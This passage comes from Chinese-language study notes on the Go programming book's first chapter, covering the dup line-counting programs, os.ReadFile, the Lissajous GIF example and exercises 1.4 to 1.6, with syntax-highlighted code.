punctuation\">,</span> counts<span class=\"token punctuation\">)</span>\n\t<span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span>\n\t\t<span class=\"token keyword\">for</span> <span class=\"token boolean\">_</span><span class=\"token punctuation\">,</span> arg <span class=\"token operator\">:=</span> <span class=\"token keyword\">range</span> files <span class=\"token punctuation\">{</span>\n\t\t\tf<span class=\"token punctuation\">,</span> err <span class=\"token operator\">:=</span> os<span class=\"token punctuation\">.</span><span class=\"token function\">Open</span><span class=\"token punctuation\">(</span>arg<span class=\"token punctuation\">)</span>\n\t\t\t<span class=\"token keyword\">if</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">{</span>\n\t\t\t\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Fprintf</span><span class=\"token punctuation\">(</span>os<span class=\"token punctuation\">.</span>Stderr<span class=\"token punctuation\">,</span> <span class=\"token string\">\"dup2: %v\\n\"</span><span class=\"token punctuation\">,</span> err<span class=\"token punctuation\">)</span>\n\t\t\t\t<span class=\"token keyword\">continue</span>\n\t\t\t<span class=\"token punctuation\">}</span>\n\t\t\t<span class=\"token function\">countLines</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">,</span> counts<span class=\"token punctuation\">)</span>\n\t\t\tf<span class=\"token punctuation\">.</span><span class=\"token function\">Close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\t\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token keyword\">for</span> line<span class=\"token punctuation\">,</span> n <span class=\"token operator\">:=</span> <span class=\"token keyword\">range</span> counts <span class=\"token punctuation\">{</span>\n\t\t<span class=\"token keyword\">if</span> n <span class=\"token operator\">&gt;</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">{</span>\n\t\t\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\\t%s\\n\"</span><span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">,</span> line<span class=\"token punctuation\">)</span>\n\t\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">countLines</span><span class=\"token punctuation\">(</span>f <span class=\"token operator\">*</span>os<span class=\"token punctuation\">.</span>File<span class=\"token punctuation\">,</span> counts <span class=\"token keyword\">map</span><span class=\"token punctuation\">[</span><span class=\"token builtin\">string</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\tinput <span class=\"token operator\">:=</span> bufio<span class=\"token punctuation\">.</span><span class=\"token function\">NewScanner</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">)</span>\n\t<span class=\"token keyword\">for</span> input<span class=\"token punctuation\">.</span><span class=\"token function\">Scan</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t\tcounts<span class=\"token punctuation\">[</span>input<span class=\"token punctuation\">.</span><span class=\"token function\">Text</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token operator\">++</span>\n\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token comment\">// NOTE: ignoring potential errors from input.Err()</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token comment\">//!-</span>\n\n</code></pre></div><figure><figcaption>image-20240318221904249</figcaption></figure>\n<p><code>os.Open</code> 函数返回两个值：</p>\n<p>第一个值是被打开的文件（<code>*os.File</code>），其后被 <code>Scanner</code> 读取。</p>\n<p>第二个值是内置 <code>error</code> 类型的值。</p>\n<ul>\n<li>如果 <code>err</code> 等于内置值<code>nil</code>（其它语言里的 <code>NULL</code>），那么文件被成功打开。读取文件，直到文件结束，然后调用 <code>Close</code> 关闭该文件，并释放占用的所有资源。</li>\n<li>如果 <code>err</code> 的值不是 <code>nil</code>，说明打开文件时出错了。这种情况下，错误值描述了所遇到的问题。使用 <code>Fprintf</code> 与表示任意类型默认格式值的动词 <code>%v</code>，向标准错误流打印一条信息，然后 <code>dup</code> 继续处理下一个文件；<code>continue</code> 语句直接跳到 <code>for</code> 循环的下个迭代开始执行。</li>\n</ul>\n<p>注意 <code>countLines</code> 函数在其声明前被调用。</p>\n<blockquote>\n<p>函数和包级别的变量（package-level entities）可以任意顺序声明，并不影响其被调用。</p>\n</blockquote>\n<h3><code>ReadFile</code></h3>\n<p><code>dup</code> 的前两个版本以\"流”模式读取输入，并根据需要拆分成多个行。理论上，这些程序可以处理任意数量的输入数据。还有另一个方法，就是一口气把全部输入数据读到内存中，一次分割为多行，然后处理它们。</p>\n<p>引入了 <code>ReadFile</code> 函数（来自于<code>io/ioutil</code>包）。但是由于这个包已经在 Go 1.16 之后弃用，下面直接写成了 <code>os.ReadFile</code>。</p>\n<p><code>os.ReadFile</code>读取指定文件的全部内容，<code>strings.Split</code> 函数把字符串分割成子串的切片。（<code>Split</code> 的作用与前文提到的 <code>strings.Join</code> 相反。）</p>\n<blockquote>\n<p>下面代码有修正，由于windows中的换行默认使用的是<code>\\r\\n</code>，所以不能只靠\\n分割</p>\n</blockquote>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">func</span> <span class=\"token function\">Dup3</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\tcounts <span class=\"token operator\">:=</span> <span class=\"token function\">make</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">map</span><span class=\"token punctuation\">[</span><span class=\"token builtin\">string</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token keyword\">for</span> <span class=\"token boolean\">_</span><span class=\"token punctuation\">,</span> filename <span class=\"token operator\">:=</span> <span class=\"token keyword\">range</span> os<span class=\"token punctuation\">.</span>Args<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">{</span>\n\t\t<span class=\"token comment\">// ReadFile 函数返回一个字节切片（byte slice），必须把它转换为 string，才能用 strings.Split 分割</span>\n\t\tdata<span class=\"token punctuation\">,</span> err <span class=\"token operator\">:=</span> os<span class=\"token punctuation\">.</span><span class=\"token function\">ReadFile</span><span class=\"token punctuation\">(</span>filename<span class=\"token punctuation\">)</span>\n\t\t<span class=\"token keyword\">if</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">{</span>\n\t\t\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Fprintf</span><span class=\"token punctuation\">(</span>os<span class=\"token punctuation\">.</span>Stderr<span class=\"token punctuation\">,</span> <span class=\"token string\">\"dup3: %v\\n\"</span><span class=\"token punctuation\">,</span> err<span class=\"token punctuation\">)</span>\n\t\t\t<span class=\"token keyword\">continue</span>\n\t\t<span class=\"token punctuation\">}</span>\n\t\t<span class=\"token comment\">// ReadFile 函数读取指定文件的全部内容，strings.Split 函数把字符串分割成子串的切片。</span>\n\t\t<span class=\"token keyword\">for</span> <span class=\"token boolean\">_</span><span class=\"token punctuation\">,</span> line <span class=\"token operator\">:=</span> <span class=\"token keyword\">range</span> strings<span class=\"token punctuation\">.</span><span class=\"token function\">Split</span><span class=\"token punctuation\">(</span><span class=\"token function\">string</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\\r\\n\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t\t\tcounts<span class=\"token punctuation\">[</span>line<span class=\"token punctuation\">]</span><span class=\"token operator\">++</span>\n\t\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token keyword\">for</span> line<span class=\"token punctuation\">,</span> n <span class=\"token operator\">:=</span> <span class=\"token keyword\">range</span> counts <span class=\"token punctuation\">{</span>\n\t\t<span class=\"token keyword\">if</span> n <span class=\"token operator\">&gt;</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">{</span>\n\t\t\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\\t%s\\r\\n\"</span><span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">,</span> line<span class=\"token punctuation\">)</span>\n\t\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n</code></pre></div><p><code>ReadFile</code> 函数返回一个字节切片（byte slice），必须把它转换为 <code>string</code>，才能用 <code>strings.Split</code> 分割。我们会在3.5.4 节详细讲解字符串和字节切片。</p>\n<p>实现上，<code>bufio.Scanner</code>、<code>ioutil.ReadFile</code> 和 <code>ioutil.WriteFile</code> 都使用 <code>*os.File</code> 的 <code>Read</code> 和 <code>Write</code> 方法，但是，大多数程序员很少需要直接调用那些低级（lower-level）函数。高级（higher-level）函数，像 <code>bufio</code> 和 <code>io/ioutil</code> 包中所提供的那些，用起来要容易点。</p>\n<h3>练习 1.4</h3>\n<p>修改 <code>dup2</code>，出现重复的行时打印文件名称。</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">package</span> main\n\n<span class=\"token keyword\">import</span> <span class=\"token punctuation\">(</span>\n\t<span class=\"token string\">\"bufio\"</span>\n\t<span class=\"token string\">\"fmt\"</span>\n\t<span class=\"token string\">\"os\"</span>\n<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\tcounts <span class=\"token operator\">:=</span> <span class=\"token function\">make</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">map</span><span class=\"token punctuation\">[</span><span class=\"token builtin\">string</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token comment\">// 用于记录文件名的hash表,每一行对应的文件名存到一个数组中</span>\n\tfileHash <span class=\"token operator\">:=</span> <span class=\"token function\">make</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">map</span><span class=\"token punctuation\">[</span><span class=\"token builtin\">string</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">string</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token comment\">// 获取命令行参数</span>\n\tfiles <span class=\"token operator\">:=</span> os<span class=\"token punctuation\">.</span>Args<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span>\n\t<span class=\"token comment\">// 如果为空，则在控制台上输入</span>\n\t<span class=\"token keyword\">if</span> <span class=\"token function\">len</span><span class=\"token punctuation\">(</span>files<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">{</span>\n\t\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"随便填,输入0终止\\r\\n\"</span><span class=\"token punctuation\">)</span>\n\t\t<span class=\"token function\">newcountlines</span><span class=\"token punctuation\">(</span>os<span class=\"token punctuation\">.</span>Stdin<span class=\"token punctuation\">,</span> counts<span class=\"token punctuation\">,</span> fileHash<span class=\"token punctuation\">)</span>\n\t<span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span>\n\t\t<span class=\"token comment\">// 不为空，遍历文件列表</span>\n\t\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"你输入的文件是:\"</span><span class=\"token punctuation\">,</span> files<span class=\"token punctuation\">)</span>\n\t\t<span class=\"token keyword\">for</span> <span class=\"token boolean\">_</span><span class=\"token punctuation\">,</span> file <span class=\"token operator\">:=</span> <span class=\"token keyword\">range</span> files <span class=\"token punctuation\">{</span>\n\t\t\t<span class=\"token comment\">// 打开文件</span>\n\t\t\tf<span class=\"token punctuation\">,</span> err <span class=\"token operator\">:=</span> os<span class=\"token punctuation\">.</span><span class=\"token function\">Open</span><span class=\"token punctuation\">(</span>file<span class=\"token punctuation\">)</span>\n\t\t\t<span class=\"token comment\">// 判断文件路径等是否出错</span>\n\t\t\t<span class=\"token keyword\">if</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">{</span>\n\t\t\t\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span>\n\t\t\t\t<span class=\"token keyword\">continue</span>\n\t\t\t<span class=\"token punctuation\">}</span>\n\t\t\t<span class=\"token comment\">// 传入contlines进行处理</span>\n\t\t\t<span class=\"token function\">newcountlines</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">,</span> counts<span class=\"token punctuation\">,</span> fileHash<span class=\"token punctuation\">)</span>\n\t\t\tf<span class=\"token punctuation\">.</span><span class=\"token function\">Close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\t\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token punctuation\">}</span>\n\n\t<span class=\"token keyword\">for</span> k<span class=\"token punctuation\">,</span> count <span class=\"token operator\">:=</span> <span class=\"token keyword\">range</span> counts <span class=\"token punctuation\">{</span>\n\t\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span>k<span class=\"token punctuation\">,</span> count<span class=\"token punctuation\">)</span>\n\t\t<span class=\"token comment\">// 打印出现的文件</span>\n\t\t<span class=\"token keyword\">if</span> count <span class=\"token operator\">&gt;</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">{</span>\n\t\t\t<span class=\"token keyword\">for</span> <span class=\"token boolean\">_</span><span class=\"token punctuation\">,</span> fname <span class=\"token operator\">:=</span> <span class=\"token keyword\">range</span> fileHash<span class=\"token punctuation\">[</span>k<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">{</span>\n\t\t\t\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s \"</span><span class=\"token punctuation\">,</span> fname<span class=\"token punctuation\">)</span>\n\t\t\t<span class=\"token punctuation\">}</span>\n\t\t\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\t\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">func</span> <span class=\"token function\">newcountlines</span><span class=\"token punctuation\">(</span>f <span class=\"token operator\">*</span>os<span class=\"token punctuation\">.</span>File<span class=\"token punctuation\">,</span> counts <span class=\"token keyword\">map</span><span class=\"token punctuation\">[</span><span class=\"token builtin\">string</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">,</span> fileHash <span class=\"token keyword\">map</span><span class=\"token punctuation\">[</span><span class=\"token builtin\">string</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">string</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t<span class=\"token comment\">// 创建读入流</span>\n\tinput <span class=\"token operator\">:=</span> bufio<span class=\"token punctuation\">.</span><span class=\"token function\">NewScanner</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">)</span>\n\t<span class=\"token comment\">// 一行一行读取</span>\n\t<span class=\"token keyword\">for</span> input<span class=\"token punctuation\">.</span><span class=\"token function\">Scan</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t\t<span class=\"token keyword\">if</span> input<span class=\"token punctuation\">.</span><span class=\"token function\">Text</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token string\">\"0\"</span> <span class=\"token punctuation\">{</span>\n\t\t\t<span class=\"token keyword\">break</span>\n\t\t<span class=\"token punctuation\">}</span>\n\t\tcounts<span class=\"token punctuation\">[</span>input<span class=\"token punctuation\">.</span><span class=\"token function\">Text</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token operator\">++</span>\n\t\t<span class=\"token comment\">// 按照每行内容，将文件名加到[]string{value}里</span>\n\t\tfileHash<span class=\"token punctuation\">[</span>input<span class=\"token punctuation\">.</span><span class=\"token function\">Text</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">append</span><span class=\"token punctuation\">(</span>fileHash<span class=\"token punctuation\">[</span>input<span class=\"token punctuation\">.</span><span class=\"token function\">Text</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> f<span class=\"token punctuation\">.</span><span class=\"token function\">Name</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n</code></pre></div><figure><figcaption>image-20240318231747959</figcaption></figure>\n<h2>1.4. GIF动画</h2>\n<p>例</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">package</span> lissajous\n\n<span class=\"token keyword\">import</span> <span class=\"token punctuation\">(</span>\n\t<span class=\"token string\">\"image\"</span>\n\t<span class=\"token string\">\"image/color\"</span>\n\t<span class=\"token string\">\"image/gif\"</span>\n\t<span class=\"token string\">\"io\"</span>\n\t<span class=\"token string\">\"math\"</span>\n\t<span class=\"token string\">\"math/rand\"</span>\n\t<span class=\"token string\">\"os\"</span>\n\t<span class=\"token string\">\"time\"</span>\n<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">var</span> palette <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>color<span class=\"token punctuation\">.</span>Color<span class=\"token punctuation\">{</span>color<span class=\"token punctuation\">.</span>White<span class=\"token punctuation\">,</span> color<span class=\"token punctuation\">.</span>Black<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">const</span> <span class=\"token punctuation\">(</span>\n\twhiteIndex <span class=\"token operator\">=</span> <span class=\"token number\">0</span> <span class=\"token comment\">// first color in palette</span>\n\tblackIndex <span class=\"token operator\">=</span> <span class=\"token number\">1</span> <span class=\"token comment\">// next color in palette</span>\n<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">Lissajous</span><span class=\"token punctuation\">(</span>out io<span class=\"token punctuation\">.</span>Writer<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span> <span class=\"token comment\">// out 这个变量是 io.Writer 类型，这个类型支持把输出结果写到很多目标</span>\n\t<span class=\"token keyword\">const</span> <span class=\"token punctuation\">(</span>\n\t\tcycles  <span class=\"token operator\">=</span> <span class=\"token number\">5</span>     <span class=\"token comment\">// number of complete x oscillator revolutions</span>\n\t\tres     <span class=\"token operator\">=</span> <span class=\"token number\">0.001</span> <span class=\"token comment\">// angular resolution</span>\n\t\tsize    <span class=\"token operator\">=</span> <span class=\"token number\">100</span>   <span class=\"token comment\">// image canvas covers [-size..+size]</span>\n\t\tnframes <span class=\"token operator\">=</span> <span class=\"token number\">64</span>    <span class=\"token comment\">// number of animation frames</span>\n\t\tdelay   <span class=\"token operator\">=</span> <span class=\"token number\">8</span>     <span class=\"token comment\">// delay between frames in 10ms units</span>\n\t<span class=\"token punctuation\">)</span>\n\n\tfreq <span class=\"token operator\">:=</span> rand<span class=\"token punctuation\">.</span><span class=\"token function\">Float64</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token number\">3.0</span> <span class=\"token comment\">// relative frequency of y oscillator</span>\n\tanim <span class=\"token operator\">:=</span> gif<span class=\"token punctuation\">.</span>GIF<span class=\"token punctuation\">{</span>LoopCount<span class=\"token punctuation\">:</span> nframes<span class=\"token punctuation\">}</span>\n\tphase <span class=\"token operator\">:=</span> <span class=\"token number\">0.0</span> <span class=\"token comment\">// phase difference</span>\n\t<span class=\"token keyword\">for</span> i <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> nframes<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span> <span class=\"token punctuation\">{</span>\n\t\trect <span class=\"token operator\">:=</span> image<span class=\"token punctuation\">.</span><span class=\"token function\">Rect</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token operator\">*</span>size<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token operator\">*</span>size<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n\t\timg <span class=\"token operator\">:=</span> image<span class=\"token punctuation\">.</span><span class=\"token function\">NewPaletted</span><span class=\"token punctuation\">(</span>rect<span class=\"token punctuation\">,</span> palette<span class=\"token punctuation\">)</span>\n\t\t<span class=\"token keyword\">for</span> t <span class=\"token operator\">:=</span> <span class=\"token number\">0.0</span><span class=\"token punctuation\">;</span> t <span class=\"token operator\">&lt;</span> cycles<span class=\"token operator\">*</span><span class=\"token number\">2</span><span class=\"token operator\">*</span>math<span class=\"token punctuation\">.</span>Pi<span class=\"token punctuation\">;</span> t <span class=\"token operator\">+=</span> res <span class=\"token punctuation\">{</span>\n\t\t\tx <span class=\"token operator\">:=</span> math<span class=\"token punctuation\">.</span><span class=\"token function\">Sin</span><span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">)</span>\n\t\t\ty <span class=\"token operator\">:=</span> math<span class=\"token punctuation\">.</span><span class=\"token function\">Sin</span><span class=\"token punctuation\">(</span>t<span class=\"token operator\">*</span>freq <span class=\"token operator\">+</span> phase<span class=\"token punctuation\">)</span>\n            <span class=\"token comment\">// 每一步它都会调用 SetColorIndex 来为(x,y)点来染黑色。</span>\n\t\t\timg<span class=\"token punctuation\">.</span><span class=\"token function\">SetColorIndex</span><span class=\"token punctuation\">(</span>size<span class=\"token operator\">+</span><span class=\"token function\">int</span><span class=\"token punctuation\">(</span>x<span class=\"token operator\">*</span>size<span class=\"token operator\">+</span><span class=\"token number\">0.5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> size<span class=\"token operator\">+</span><span class=\"token function\">int</span><span class=\"token punctuation\">(</span>y<span class=\"token operator\">*</span>size<span class=\"token operator\">+</span><span class=\"token number\">0.5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n\t\t\t\tblackIndex<span class=\"token punctuation\">)</span>\n\t\t<span class=\"token punctuation\">}</span>\n\t\tphase <span class=\"token operator\">+=</span> <span class=\"token number\">0.1</span>\n\t\tanim<span class=\"token punctuation\">.</span>Delay <span class=\"token operator\">=</span> <span class=\"token function\">append</span><span class=\"token punctuation\">(</span>anim<span class=\"token punctuation\">.</span>Delay<span class=\"token punctuation\">,</span> delay<span class=\"token punctuation\">)</span>\n\t\tanim<span class=\"token punctuation\">.</span>Image <span class=\"token operator\">=</span> <span class=\"token function\">append</span><span class=\"token punctuation\">(</span>anim<span class=\"token punctuation\">.</span>Image<span class=\"token punctuation\">,</span> img<span class=\"token punctuation\">)</span>\n\t<span class=\"token punctuation\">}</span>\n\tgif<span class=\"token punctuation\">.</span><span class=\"token function\">EncodeAll</span><span class=\"token punctuation\">(</span>out<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>anim<span class=\"token punctuation\">)</span> <span class=\"token comment\">// NOTE: ignoring encoding errors</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">LissajousMain</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\trand<span class=\"token punctuation\">.</span><span class=\"token function\">Seed</span><span class=\"token punctuation\">(</span>time<span class=\"token punctuation\">.</span><span class=\"token function\">Now</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">UTC</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">UnixNano</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token function\">Lissajous</span><span class=\"token punctuation\">(</span>os<span class=\"token punctuation\">.</span>Stdout<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n\n</code></pre></div><p>当我们import了一个包路径包含有多个单词的package时，比如image/color（image和color两个单词），后面调用的时候，只写最后那个单词就可以。所以当我们写color.White时，这个变量指向的是image/color包里的变量。</p>\n<h3>常量</h3>\n<p>常量是指在程序编译后运行时始终都不会变化的值。</p>\n<p>常量声明和变量声明一般都会出现在包级别，所以这些常量在整个包中都是可以共享的，或者你也可以把常量声明定义在函数体内部，那么这种常量就只能在函数体内用。</p>\n<p>常量声明的值必须是一个<strong>数字值</strong>、<strong>字符串</strong>或者<strong>固定的boolean值</strong>。</p>\n<h3>复合声明</h3>\n<p><code>[]color.Color{...}</code> 和 <code>gif.GIF{...}</code> 这两个表达式是复合声明(4.2 和 4.4.1 节有说明) 。这是实例化 Go 语言里的复合类型的一种写法。</p>\n<p>前者生成的是一个 slice 切片，后者生成的是一个 struct 结构体。</p>\n<blockquote>\n<p>后面再看吧</p>\n</blockquote>\n<h3>踩坑</h3>\n<p>powershell 重定向管道 <code>go run main.go &gt; out.gif</code> 生成的 gif 图片将会出错无法打开。</p>\n<p>powershell 的标准输出流如果进行管道重定向会进行转换。参考<a href=\"https://stackoverflow.com/questions/56323293/go-generated-animated-gifs-didnt-work-in-windows\" target=\"_blank\" rel=\"noopener noreferrer\">image - Go-generated animated GIFs didn't work in windows - Stack Overflow</a></p>\n<p>下面使用cmd运行，结果：</p>\n<figure><figcaption>image-20240319162930634</figcaption></figure>\n<h3>练习 1.5</h3>\n<p>修改前面的Lissajous程序里的调色板，由黑色改为绿色。我们可以用<code>color.RGBA{0xRR, 0xGG, 0xBB, 0xff}</code>来得到<code>#RRGGBB</code>这个色值，三个十六进制的字符串分别代表红、绿、蓝像素。改成这样就行了</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">var</span> palette <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>color<span class=\"token punctuation\">.</span>Color<span class=\"token punctuation\">{</span>color<span class=\"token punctuation\">.</span>White<span class=\"token punctuation\">,</span> color<span class=\"token punctuation\">.</span>RGBA<span class=\"token punctuation\">{</span><span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xff</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xff</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">}</span>\n</code></pre></div><h3>练习1.6</h3>\n<p>修改Lissajous程序，修改其调色板来生成更丰富的颜色，然后修改SetColorIndex的第三个参数，</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">package</span> lissajousPractice\n\n<span class=\"token keyword\">import</span> <span class=\"token punctuation\">(</span>\n\t<span class=\"token string\">\"image\"</span>\n\t<span class=\"token string\">\"image/color\"</span>\n\t<span class=\"token string\">\"image/gif\"</span>\n\t<span class=\"token string\">\"io\"</span>\n\t<span class=\"token string\">\"math\"</span>\n\t<span class=\"token string\">\"math/rand\"</span>\n\t<span class=\"token string\">\"os\"</span>\n\t<span class=\"token string\">\"time\"</span>\n<span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\">// 练习1.5 调色板由黑色变成绿色</span>\n<span class=\"token comment\">// var palette = []color.Color{color.White, color.RGBA{0x00, 0xff, 0x00, 0xff}}</span>\n\n<span class=\"token comment\">// 练习1.6 颜色增多</span>\n<span class=\"token keyword\">var</span> palette <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>color<span class=\"token punctuation\">.</span>Color<span class=\"token punctuation\">{</span>color<span class=\"token punctuation\">.</span>White<span class=\"token punctuation\">,</span> color<span class=\"token punctuation\">.</span>Black<span class=\"token punctuation\">,</span> color<span class=\"token punctuation\">.</span>RGBA<span class=\"token punctuation\">{</span><span class=\"token number\">0xff</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xff</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> color<span class=\"token punctuation\">.</span>RGBA<span class=\"token punctuation\">{</span><span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xff</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xff</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> color<span 